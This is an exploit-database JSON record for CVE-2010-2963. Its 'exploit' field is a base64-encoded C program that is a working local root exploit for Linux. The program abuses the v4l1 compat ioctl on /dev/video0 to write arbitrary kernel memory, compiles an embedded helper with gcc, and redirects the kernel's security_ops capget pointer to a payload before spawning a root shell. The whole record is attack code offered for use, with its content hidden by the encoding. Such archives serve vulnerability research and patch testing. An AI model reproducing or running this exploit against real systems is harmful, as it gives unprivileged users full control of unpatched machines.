{
    "source": "exploit-database", 
    "exploit": "Ly8gc291cmNlOiBodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC80NDI0Mi9pbmZvDQovKg0KICogQ1ZFLTIwMTAtMjk2Mw0KICogQXJiaXRyYXJ5IHdyaXRlIG1lbW9yeSB3cml0ZSB2aWEgdjRsMSBjb21wYXQgaW9jdGwuDQogKiBLZWVzIENvb2sgPGtlZXNAdWJ1bnR1LmNvbT4NCiAqDQogKiBncmVldHMgdG8gZHJvc2VuYmVyZywgc3BlbmRlciwgdGF2aXNvDQogKi8NCg0KI2RlZmluZSBfR05VX1NPVVJDRQ0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlICJleHBfZnJhbWV3b3JrLmgiDQoNCiNpbmNsdWRlIDxzdGRpbnQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxwb2xsLmg+DQojaW5jbHVkZSA8c3lzL2lvY3RsLmg+DQojaW5jbHVkZSA8c3lzL2lwYy5oPg0KI2luY2x1ZGUgPHN5cy9tc2cuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxsaW51eC92aWRlb2Rldi5oPg0KI2luY2x1ZGUgPHN5c2NhbGwuaD4NCg0KI2luY2x1ZGUgPHN5cy9jYXBhYmlsaXR5Lmg+DQpzdHJ1Y3QgY2FwX2hlYWRlcl90IHsNCiAgICB1aW50MzJfdCB2ZXJzaW9uOw0KICAgIGludCBwaWQ7DQp9Ow0KDQojZGVmaW5lIERFVklDRSAiL2Rldi92aWRlbzAiDQoNCnN0cnVjdCBleHBsb2l0X3N0YXRlICpleHBfc3RhdGU7DQoNCmNoYXIgKmRlc2MgPSAiVnlha2FyYW5hOiBMaW51eCB2NGwxIGNvbXBhdCBpb2N0bCBhcmJpdHJhcnkgbWVtb3J5IHdyaXRlIjsNCmludCByZXF1aXJlc19udWxsX3BhZ2UgPSAwOw0KDQppbnQgYnVpbHQgPSAwOw0KDQppbnQgc3VwZXJfbWVtY3B5KHVuc2lnbmVkIGxvbmcgZGVzdGluYXRpb24sIHZvaWQgKnNvdXJjZSwgaW50IGxlbmd0aCkNCnsNCiAgICBzdHJ1Y3QgdmlkZW9fY29kZSB2YyA9IHsgfTsNCiAgICBzdHJ1Y3QgdmlkZW9fdHVuZXIgdHVuZXIgPSB7IH07DQogICAgaW50IGRldjsNCiAgICB1bnNpZ25lZCBpbnQgY29kZTsNCiAgICBjaGFyIGNtZFs4MF07DQoNCiAgICBpZiAoIWJ1aWx0KSB7DQogICAgICAgIEZJTEUgKnNvdXJjZTsNCiAgICAgICAgY2hhciAqc291cmNlY29kZSA9ICIvKlxuXA0KICogQ1ZFLTIwMTAtMjk2MzogV3JpdGUga2VybmVsIG1lbW9yeSB2aWEgdjRsIGNvbXBhdCBpb2N0bC5cblwNCiAqIE9jdCAxMSwgMjAxMCAgS2VlcyBDb29rIDxrZWVzQHVidW50dS5jb20+XG5cDQogKlxuXA0KICovXG5cDQojZGVmaW5lIF9HTlVfU09VUkNFXG5cDQojaW5jbHVkZSA8c3RkaW8uaD5cblwNCiNpbmNsdWRlIDxzdGRsaWIuaD5cblwNCiNpbmNsdWRlIDxzdGRpbnQuaD5cblwNCiNpbmNsdWRlIDx1bmlzdGQuaD5cblwNCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD5cblwNCiNpbmNsdWRlIDxzeXMvc3RhdC5oPlxuXA0KI2luY2x1ZGUgPGZjbnRsLmg+XG5cDQojaW5jbHVkZSA8c3RyaW5nLmg+XG5cDQojaW5jbHVkZSA8c3lzL2lvY3RsLmg+XG5cDQojaW5jbHVkZSA8c3lzL21tYW4uaD5cblwNCiNpbmNsdWRlIDxhc3NlcnQuaD5cblwNCiNpbmNsdWRlIDxtYWxsb2MuaD5cblwNCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD5cblwNCiNpbmNsdWRlIDxsaW51eC92aWRlb2Rldi5oPlxuXA0KI2luY2x1ZGUgPHN5c2NhbGwuaD5cblwNClxuXA0KI2RlZmluZSBERVZJQ0UgXCIvZGV2L3ZpZGVvMFwiXG5cDQpcblwNCnN0cnVjdCB2aWRlb19jb2RlMzIge1xuXA0KICAgICAgICBjaGFyICAgICAgICAgICAgbG9hZHdoYXRbMTZdO1xuXA0KICAgICAgICBpbnQgICAgICAgICAgICAgZGF0YXNpemU7XG5cDQogICAgICAgIGludCAgICAgICAgICAgICBwYWRkaW5nO1xuXA0KICAgICAgICB1aW50NjRfdCAgICAgICAgZGF0YTtcblwNCn07XG5cDQpcblwNCmludCBzdXBlcl9tZW1jcHkodWludDY0X3QgZGVzdGluYXRpb24sIHZvaWQgKnNvdXJjZSwgaW50IGxlbmd0aClcblwNCntcblwNCiAgICBzdHJ1Y3QgdmlkZW9fY29kZTMyIHZjID0geyB9O1xuXA0KICAgIHN0cnVjdCB2aWRlb190dW5lciB0dW5lciA9IHsgfTtcblwNCiAgICBpbnQgZGV2O1xuXA0KICAgIHVuc2lnbmVkIGludCBjb2RlO1xuXA0KXG5cDQogICAgaWYgKCAoZGV2PW9wZW4oREVWSUNFLCBPX1JEV1IpKSA8IDApIHtcblwNCiAgICAgICAgcGVycm9yKERFVklDRSk7XG5cDQogICAgICAgIHJldHVybiAxO1xuXA0KICAgIH1cblwNClxuXA0KICAgIHZjLmRhdGFzaXplID0gbGVuZ3RoO1xuXA0KICAgIHZjLmRhdGEgPSAodWludDY0X3QpKHVpbnRwdHJfdClzb3VyY2U7XG5cDQpcblwNCiAgICBtZW1zZXQoJnR1bmVyLCAweEJCLCBzaXplb2YodHVuZXIpKTtcblwNClxuXA0KICAgIC8vIG1hbnVhbCB1bmlvbiwgc2luY2UgYSByZWFsIHVuaW9uIHdvbid0IGRvIHB0cnMgZm9yIDY0Yml0XG5cDQogICAgdWludDY0X3QgKnB0ciA9ICh1aW50NjRfdCopKCYodHVuZXIubmFtZVsyMF0pKTtcblwNCiAgICAqcHRyID0gZGVzdGluYXRpb247XG5cDQpcblwNCiAgICAvLyBiZWF0IG1lbW9yeSBpbnRvIHRoZSBzdGFjay4uLlxuXA0KICAgIGNvZGUgPSBWSURJT0NTVFVORVI7XG5cDQogICAgc3lzY2FsbCg1NCwgZGV2LCBjb2RlLCAmdHVuZXIpO1xuXA0KICAgIHN5c2NhbGwoNTQsIGRldiwgY29kZSwgJnR1bmVyKTtcblwNCiAgICBzeXNjYWxsKDU0LCBkZXYsIGNvZGUsICZ0dW5lcik7XG5cDQogICAgc3lzY2FsbCg1NCwgZGV2LCBjb2RlLCAmdHVuZXIpO1xuXA0KICAgIHN5c2NhbGwoNTQsIGRldiwgY29kZSwgJnR1bmVyKTtcblwNCiAgICBzeXNjYWxsKDU0LCBkZXYsIGNvZGUsICZ0dW5lcik7XG5cDQpcblwNCiAgICBjb2RlID0gMHg0MDIwNzYxYjsgLy8gVklESU9DU01JQ1JPQ09ERTMyICh3aHkgaXNuJ3QgdGhpcyBWSURJT0NTTUlDUk9DT0RFPylcblwNCiAgICBzeXNjYWxsKDU0LCBkZXYsIGNvZGUsICZ2Yyk7XG5cDQpcblwNCiAgICByZXR1cm4gMDtcblwNCn1cblwNClxuXA0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSlcblwNCntcblwNCiAgICB1aW50NjRfdCBkZXN0aW5hdGlvbiA9IHN0cnRvdWxsKGFyZ3ZbMV0sIE5VTEwsIDE2KTtcblwNCiAgICB1aW50NjRfdCB2YWx1ZSA9IHN0cnRvdWxsKGFyZ3ZbMl0sIE5VTEwsIDE2KTtcblwNCiAgICBpbnQgbGVuZ3RoID0gYXRvaShhcmd2WzNdKTtcblwNCiAgICBpZiAobGVuZ3RoID4gc2l6ZW9mKHZhbHVlKSlcblwNCiAgICAgICAgbGVuZ3RoID0gc2l6ZW9mKHZhbHVlKTtcblwNCiAgICByZXR1cm4gc3VwZXJfbWVtY3B5KGRlc3RpbmF0aW9uLCAmdmFsdWUsIGxlbmd0aCk7XG5cDQp9XG5cDQoiOw0KDQogICAgICAgIGlmICghKHNvdXJjZSA9IGZvcGVuKCJ2eWFrYXJhbmEuYyIsInciKSkpIHsNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiY2Fubm90IHdyaXRlIHNvdXJjZVxuIik7DQogICAgICAgICAgICByZXR1cm4gMTsNCiAgICAgICAgfQ0KICAgICAgICBmd3JpdGUoc291cmNlY29kZSwgc3RybGVuKHNvdXJjZWNvZGUpLCAxLCBzb3VyY2UpOw0KICAgICAgICBmY2xvc2Uoc291cmNlKTsNCiAgICAgICAgaWYgKHN5c3RlbSgiZ2NjIC1XYWxsIC1tMzIgdnlha2FyYW5hLmMgLW8gdnlha2FyYW5hIikgIT0gMCkgew0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJjYW5ub3QgYnVpbGQgc291cmNlXG4iKTsNCiAgICAgICAgICAgIHJldHVybiAxOw0KICAgICAgICB9DQogICAgICAgIGJ1aWx0ID0gMTsNCiAgICB9DQoNCiAgICBwcmludGYoIldyaXRpbmcgdG8gJXAgKGxlbiAlZCk6ICIsICh2b2lkKilkZXN0aW5hdGlvbiwgbGVuZ3RoKTsNCiAgICBmb3IgKGRldj0wOyBkZXY8bGVuZ3RoOyBkZXYrKykgew0KICAgICAgICBwcmludGYoIjB4JTAyeCAiLCAqKCh1bnNpZ25lZCBjaGFyKilzb3VyY2UrZGV2KSk7DQogICAgfQ0KICAgIHByaW50ZigiXG4iKTsNCg0KICAgIHNwcmludGYoY21kLCAiLi92eWFrYXJhbmEgJWx4ICVseCA4IiwgKHVpbnQ2NF90KSh1aW50cHRyX3QpZGVzdGluYXRpb24sICoodWludDY0X3QqKXNvdXJjZSk7DQogICAgcmV0dXJuIHN5c3RlbShjbWQpOw0KfQ0KDQppbnQgZ2V0X2V4cGxvaXRfc3RhdGVfcHRyKHN0cnVjdCBleHBsb2l0X3N0YXRlICpwdHIpDQp7DQogICAgZXhwX3N0YXRlID0gcHRyOw0KICAgIHJldHVybiAwOw0KfQ0KDQp1bnNpZ25lZCBsb25nIGRlZmF1bHRfc2VjOw0KdW5zaWduZWQgbG9uZyB0YXJnZXQ7DQp1bnNpZ25lZCBsb25nIHJlc3RvcmU7DQoNCmludCBwcmVwYXJlKHVuc2lnbmVkIGNoYXIgKmJ1ZikNCnsNCiAgICB1bnNpZ25lZCBsb25nIGFkZHI7DQoNCiAgICBpZiAoc2l6ZW9mKGxvbmcpIT04KSB7DQogICAgICAgIHByaW50ZigiTm90IGVub3VnaCBiaXRzXG4iKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgcHJpbnRmKCJSZXRpY3VsYXRpbmcgc3BsaW5lcy4uLlxuIik7DQoNCiAgICBhZGRyID0gZXhwX3N0YXRlLT5nZXRfa2VybmVsX3N5bSgic2VjdXJpdHlfb3BzIik7DQogICAgZGVmYXVsdF9zZWMgPSBleHBfc3RhdGUtPmdldF9rZXJuZWxfc3ltKCJkZWZhdWx0X3NlY3VyaXR5X29wcyIpOw0KICAgIHJlc3RvcmUgPSBleHBfc3RhdGUtPmdldF9rZXJuZWxfc3ltKCJjYXBfY2FwZ2V0Iik7DQoNCiAgICAvLyByZXNldCBzZWN1cml0eV9vcHMNCiAgICBzdXBlcl9tZW1jcHkoYWRkciwgJmRlZmF1bHRfc2VjLCBzaXplb2Yodm9pZCopKTsNCg0KICAgIC8vIGFpbSBjYXBnZXQgdG8gZW5saWdodGVubWVudCBwYXlsb2FkDQogICAgdGFyZ2V0ID0gZGVmYXVsdF9zZWMgKyAoKDExICsgc2l6ZW9mKHZvaWQqKSAtMSkgLyBzaXplb2Yodm9pZCopKSpzaXplb2Yodm9pZCopICsgKDIgKiBzaXplb2Yodm9pZCopKTsNCiAgICBzdXBlcl9tZW1jcHkodGFyZ2V0LCAmKGV4cF9zdGF0ZS0+b3duX3RoZV9rZXJuZWwpLCBzaXplb2Yodm9pZCopKTsNCg0KICAgIHJldHVybiAwOw0KfQ0KDQppbnQgdHJpZ2dlcih2b2lkKQ0Kew0KICAgIHN0cnVjdCBjYXBfaGVhZGVyX3QgaGRyOw0KICAgIHVpbnQzMl90IGRhdGFbM107DQoNCiAgICBwcmludGYoIlNraXBwaW5nIHNjaG9vbC4uLlxuIik7DQoNCiAgICBoZHIudmVyc2lvbiA9IF9MSU5VWF9DQVBBQklMSVRZX1ZFUlNJT05fMTsNCiAgICBoZHIucGlkID0gMTsNCiAgICBjYXBnZXQoKGNhcF91c2VyX2hlYWRlcl90KSZoZHIsIChjYXBfdXNlcl9kYXRhX3QpZGF0YSk7DQoNCiAgICByZXR1cm4gMTsNCn0NCg0KaW50IHBvc3Qodm9pZCkNCnsNCiAgICBwcmludGYoIlJlc3RvcmluZyBncmFtbWFyLi4uXG4iKTsNCg0KICAgIC8vIHJlc3RvcmUgc2VjdXJpdHkgb3AgcG9pbnRlcg0KICAgIHN1cGVyX21lbWNweSh0YXJnZXQsICZyZXN0b3JlLCBzaXplb2Yodm9pZCopKTsNCg0KICAgIHJldHVybiBSVU5fUk9PVFNIRUxMOw0KfQ==", 
    "filename": "platforms/linux/local/15344.c", 
    "id": "15344", 
    "cves": [
        "CVE-2010-2963"
    ]
}